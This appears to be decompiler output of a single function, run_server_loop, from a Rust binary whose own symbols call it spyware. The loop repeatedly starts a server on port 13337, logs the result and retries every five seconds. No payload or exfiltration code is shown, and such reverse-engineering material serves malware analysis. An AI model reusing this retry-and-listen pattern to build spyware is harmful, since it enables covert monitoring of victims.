
  fn spyware::run_server_loop::ha507d6dda312d1be() -> !

{
    loop
    {
        let mut var_b8: fn(arg1: *mut i64, arg2: *mut i64) -> i64;
        let mut var_b0: *const i8;
        let mut var_80: *mut *mut c_void;
        let mut var_68: i128;
        let mut var_50: *mut fn(arg1: *mut i64, arg2: *mut i64) -> i64;
        let mut rax_2: fn(arg1: *mut i64, arg2: *mut i64) -> i64;
        
        if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4
        {
            var_80 = &data_4b92a0;
            let var_78_2: i64 = 1;
            let var_70_2: i64 = 8;
            var_68 = {0};
            let rax_5: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9300);
            var_b0 = "spyware:Successfully connected t…";
            let var_a8_2: i64 = 7;
            let var_a0_2: *const i8 = "spyware:Successfully connected t…";
            let var_98_2: i64 = 7;
            let var_90_2: i64 = rax_5;
            log::__private_api::log::h13afddf373bd7d7f(&var_80, 4, &var_b0);
            rax_2 = spyware::communication::server::run_server::hf575f6adb91dbfb6(0x3419);
            
            if rax_2 != 0
            {
                'label_45191c:
                let mut var_88: fn(arg1: *mut i64, arg2: *mut i64) -> i64 = rax_2;
                
                if core::sync::atomic::atomic_load::h8c88032dab18ab12() != 0
                {
                    var_b8 = 5;
                    var_50 = &var_88;
                    let var_48_1: fn(arg1: *mut i64, arg2: *mut i64) -> i64 = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
                    let var_40_1: *mut fn(arg1: *mut i64, arg2: *mut i64) -> i64 = &var_b8;
                    let var_38_1: fn(arg1: *mut i64, arg2: *mut i8) -> u64 = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$u64$GT$::fmt::h5424ed13591dfd18;
                    var_80 = &data_4b92b0;
                    let var_78_1: i64 = 3;
                    *var_68[8] = 0;
                    let var_70_1: *mut *mut fn(arg1: *mut i64, arg2: *mut i64) -> i64 = &var_50;
                    var_68 = 2;
                    let rax_4: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9318);
                    var_b0 = "spyware:Successfully connected t…";
                    let var_a8_1: i64 = 7;
                    let var_a0_1: *const i8 = "spyware:Successfully connected t…";
                    let var_98_1: i64 = 7;
                    let var_90_1: i64 = rax_4;
                    log::__private_api::log::h13afddf373bd7d7f(&var_80, 1, &var_b0);
                }
                
                core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(&var_88);
            }
        }
        else
        {
            rax_2 = spyware::communication::server::run_server::hf575f6adb91dbfb6(0x3419);
            
            if rax_2 != 0
            {
                goto 'label_45191c;
            }
        }
        
        if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4
        {
            var_b8 = 5;
            var_50 = &var_b8;
            let var_48_2: fn(arg1: *mut i64, arg2: *mut i8) -> u64 = core::fmt::num::imp::_$LT$impl$u20$core..fmt..Display$u20$for$u20$u64$GT$::fmt::h5424ed13591dfd18;
            var_80 = &data_4b92e0;
            let var_78_3: i64 = 2;
            *var_68[8] = 0;
            let var_70_3: *mut *mut fn(arg1: *mut i64, arg2: *mut i64) -> i64 = &var_50;
            var_68 = 1;
            let rax_7: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9330);
            var_b0 = "spyware:Successfully connected t…";
            let var_a8_3: i64 = 7;
            let var_a0_3: *const i8 = "spyware:Successfully connected t…";
            let var_98_3: i64 = 7;
            let var_90_3: i64 = rax_7;
            log::__private_api::log::h13afddf373bd7d7f(&var_80, 4, &var_b0);
        }
        
        std::thread::sleep::h1a6eeffe1c923e1f(5, 0);
    }
}
